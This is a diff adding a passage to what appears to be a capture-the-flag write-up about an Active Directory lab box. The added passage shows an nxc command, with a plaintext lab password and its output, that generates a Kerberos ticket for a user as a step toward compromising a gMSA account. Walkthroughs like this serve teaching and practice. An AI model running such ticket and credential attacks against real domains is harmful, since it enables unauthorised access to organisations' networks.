@@ -631,7 +631,19 @@ Now the user is part of the group!
 
 # Compromising `Pong_gMSA$`
 
-The current TGT i have for `c.roberts` does not reflect the group 
+The current TGT i have for `c.roberts` does not reflect the group change, so ill need to get a new one
+
+```python
+❯❯❯ faketime -f +8h nxc smb dc1.ping.htb -u c.roberts -p 'AssumedBreach123' -k --generate-tgt c.roberts                   
+SMB         dc1.ping.htb    445    dc1              [*]  x64 (name:dc1) (domain:ping.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc1.ping.htb    445    dc1              [+] ping.htb\c.roberts:AssumedBreach123 
+SMB         dc1.ping.htb    445    dc1              [+] TGT saved to: c.roberts.ccache
+SMB         dc1.ping.htb    445    dc1              [+] Run the following command to use the TGT: export KRB5CCNAME=c.roberts.ccache
+
+❯❯❯ 
+```
+
+Now i have a new TGT, ill make sure to export it
 
 
 
